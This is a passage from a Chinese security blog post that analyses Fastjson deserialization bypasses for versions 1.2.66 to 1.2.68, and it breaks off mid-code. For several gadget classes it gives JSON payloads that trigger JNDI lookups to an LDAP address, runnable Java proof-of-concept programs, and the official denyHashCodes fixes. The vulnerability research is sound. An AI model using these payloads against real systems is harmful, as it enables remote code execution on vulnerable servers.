class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initCtx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="keyword">return</span> initCtx.lookup((String) object);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(e);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="总结-10">总结</h5>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h5 id="例子-10">例子</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;healthCheckRegistry\&quot;: \&quot;ldap://127.0.0.1:14514/test\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="jtatransactionconfig">JtaTransactionConfig</h3>
<h4 id="分析-11">分析</h4>
<p>配置如下。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.ibatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ibatis-sqlmap<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.4.726<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javaee-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>也是很清晰的一个链，<strong>setProperties</strong> 中获取
<strong>UserTransaction</strong>，然后调用
<strong>initCtx.lookup</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JtaTransactionConfig (com.ibatis.sqlmap.engine.transaction.jta)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProperties</span><span class="params">(Properties props)</span> <span class="keyword">throws</span> SQLException, TransactionException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">utxName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        utxName = (String) props.get(<span class="string">&quot;UserTransaction&quot;</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initCtx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        userTransaction = (UserTransaction) initCtx.lookup(utxName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">    	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SqlMapException</span>(<span class="string">&quot;Error initializing JtaTransactionConfig while looking up UserTransaction (&quot;</span> + utxName + <span class="string">&quot;).  Cause: &quot;</span> + e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="总结-11">总结</h4>
<p>新的绕过链，构造如下。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Properties&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;UserTransaction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="例子-11">例子</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;properties\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.util.Properties\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;UserTransaction\&quot;: \&quot;ldap://127.0.0.1:14514/test\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修复-7">修复</h3>
<p>官方在 <strong>1.2.67</strong> 对漏洞进行了<a
href="https://github.com/alibaba/fastjson/commit/78881ef57802eba763745882e0f62b3d9fe65407">修复</a>，加了如下
<strong>denyHashCodes</strong>。</p>
<table>
<colgroup>
<col style="width: 10%" />
<col style="width: 30%" />
<col style="width: 27%" />
<col style="width: 32%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">version</th>
<th>hash</th>
<th>hex-hash</th>
<th>name</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">1.2.67</td>
<td>-7775351613326101303L</td>
<td>0x941866e73beff4c9L</td>
<td>org.apache.shiro.realm.</td>
</tr>
<tr class="even">
<td style="text-align: left;">1.2.67</td>
<td>2731823439467737506L</td>
<td>0x25e962f1c28f71a2L</td>
<td>br.com.anteros.</td>
</tr>
<tr class="odd">
<td style="text-align: left;">1.2.67</td>
<td>-2378990704010641148L</td>
<td>0xdefc208f237d4104L</td>
<td>com.ibatis.</td>
</tr>
</tbody>
</table>
<h2 id="section-8">1.2.67</h2>
<h3 id="简介-8">简介</h3>
<p><strong>FastJson &lt;= 1.2.67</strong> 均生效。</p>
<p>新的 <strong>Gadget</strong> 绕过黑名单，需要开启
<strong>AutoTypeSupport</strong>。</p>
<h3 id="cachejnditmlookup">CacheJndiTmLookup</h3>
<h4 id="分析-12">分析</h4>
<p>配置如下。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.ignite<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ignite-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.15.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.ignite<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ignite-jta<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.15.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在这条链中，<strong>getTm</strong> 被触发，调用了
<strong>ctx.lookup</strong>，但是这个方法并不符合上文所述的特殊
<strong>Getter</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CacheJndiTmLookup (org.apache.ignite.cache.jta.jndi)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setJndiNames</span><span class="params">(List&lt;String&gt; jndiNames)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.jndiNames = jndiNames;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Nullable</span> <span class="meta">@Override</span> <span class="keyword">public</span> TransactionManager <span class="title function_">getTm</span><span class="params">()</span> <span class="keyword">throws</span> IgniteException &#123;</span><br><span class="line">    <span class="keyword">assert</span> jndiNames != <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">assert</span> !jndiNames.isEmpty();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String s : jndiNames) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctx.lookup(s);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (obj != <span class="literal">null</span> &amp;&amp; obj <span class="keyword">instanceof</span> TransactionManager)</span><br><span class="line">                <span class="keyword">return</span> (TransactionManager)obj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IgniteException</span>(<span class="string">&quot;Unable to lookup TM by: &quot;</span> + jndiNames, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="循环引用">循环引用</h5>
<p>这里涉及到一个 <strong>FastJson</strong> 的<a
href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">循环引用</a>问题。</p>
<table>
<thead>
<tr class="header">
<th>语法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>{"$ref":"$"}</td>
<td>引用根对象</td>
</tr>
<tr class="even">
<td>{"$ref":"@"}</td>
<td>引用自己</td>
</tr>
<tr class="odd">
<td>{"$ref":".."}</td>
<td>引用父对象</td>
</tr>
<tr class="even">
<td>{"$ref":"../.."}</td>
<td>引用父对象的父对象</td>
</tr>
<tr class="odd">
<td>{"$ref":"$.members[0].reportTo"}</td>
<td>基于路径的引用</td>
</tr>
</tbody>
</table>
<p>因此可以通过这个循环引用来调用其他方法。</p>
<h4 id="总结-12">总结</h4>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiNames&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    	<span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.tm&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="例子-12">例子</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;jndiNames\&quot;: [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;ldap://127.0.0.1:14514/test\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    ],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;tm\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \t\&quot;$ref\&quot;: \&quot;$.tm\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="jndiobjectfactory">JndiObjectFactory</h3>
<h4 id="分析-13">分析</h4>
<p>配置如下。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.11.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>同样是循环引用调用的 <strong>getInstance</strong> 到
<strong>lookup</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JndiLocator (org.apache.shiro.jndi)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setResourceName</span><span class="params">(String resourceName)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.resourceName = resourceName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(requiredType != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> requiredType.cast(<span class="built_in">this</span>.lookup(resourceName, requiredType));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (T) <span class="built_in">this</span>.lookup(resourceName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> requiredType != <span class="literal">null</span> ? requiredType.getName() : <span class="string">&quot;object&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unable to look up &quot;</span> + typeName + <span class="string">&quot; with jndi name &#x27;&quot;</span> + resourceName + <span class="string">&quot;&#x27;.&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="总结-13">总结</h4>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;resourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;instance&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    	<span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.instance&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="例子-13">例子</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;resourceName\&quot;: \&quot;ldap://127.0.0.1:14514/test\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;instance\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \t\&quot;$ref\&quot;: \&quot;$.instance\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修复-8">修复</h3>
<p>官方在 <strong>1.2.68</strong> 对漏洞进行了<a
href="https://github.com/alibaba/fastjson/commit/a51ee399a85b376170f7cc85e7e66695ce56e496">修复</a>，加了如下
<strong>denyHashCodes</strong>。</p>
<table>
<colgroup>
<col style="width: 9%" />
<col style="width: 28%" />
<col style="width: 25%" />
<col style="width: 37%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">version</th>
<th>hash</th>
<th>hex-hash</th>
<th>name</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">1.2.68</td>
<td>-3077205613010077203L</td>
<td>0xd54b91cc77b239edL</td>
<td>org.apache.shiro.jndi.</td>
</tr>
<tr class="even">
<td style="text-align: left;">1.2.68</td>
<td>-2825378362173150292L</td>
<td>0xd8ca3d595e982bacL</td>
<td>org.apache.ignite.cache.jta.</td>
</tr>
</tbody>
</table>
<h2 id="section-9">1.2.68</h2>
<h3 id="简介-9">简介</h3>
<p><strong>FastJson &lt;= 1.2.68</strong> 均生效。</p>
<p><strong>expectClass</strong> 子类绕过，无需开启
<strong>AutoTypeSupport</strong>。</p>
<h3 id="分析-14">分析</h3>
<p>配置如下。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>跟着 <strong>Payload</strong> 看一遍流程吧。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tempPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;targetPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/2&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong>DefaultJSONParser#parseObject</strong> 读到
<strong>key</strong> 为 <strong>DEFAULT_TYPE_KEY</strong> 即
<strong><span class="citation"
data-cites="type">@type</span></strong>，进入
<strong>if</strong>，<strong>27</strong> 行处因为非数字所以调用
<strong>checkAutoType</strong>，此时 <strong>expectClass</strong>
为空。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DefaultJSONParser (com.alibaba.fastjson.parser)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	<span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY</span><br><span class="line">            &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (object != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; object.getClass().getName().equals(typeName)) &#123;</span><br><span class="line">            clazz = object.getClass();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">allDigits</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; typeName.length(); ++i) &#123;</span><br><span class="line">                <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> typeName.charAt(i);</span><br><span class="line">                <span class="keyword">if</span> (c &lt; <span class="string">&#x27;0&#x27;</span> || c &gt; <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                    allDigits = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!allDigits) &#123;</span><br><span class="line">                clazz = config.checkAutoType(typeName, <span class="literal">null</span>, lexer.getFeatures());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>checkAutoType</strong> 中由于 <strong>expectClass</strong>
为空，所以 <strong>expectClassFlag</strong> 为
<strong>false</strong>，且其不在
<strong>INTERNAL_WHITELIST_HASHCODES</strong> 中，所以一路跳过各种
<strong>if</strong> 判断，直接 <strong>getClassFromMapping</strong> 拿到
<strong>AutoCloseable</strong> 类，然后返回。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ParserConfig (com.alibaba.fastjson.parser)</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> expectClassFlag;</span><br><span class="line">    <span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">        expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass == Object.class</span><br><span class="line">                || expectClass == Serializable.class</span><br><span class="line">                || expectClass == Cloneable.class</span><br><span class="line">                || expectClass == Closeable.class</span><br><span class="line">                || expectClass == EventListener.class</span><br><span class="line">                || expectClass == Iterable.class</span><br><span class="line">                || expectClass == Collection.class</span><br><span class="line">                ) &#123;</span><br><span class="line">            expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> 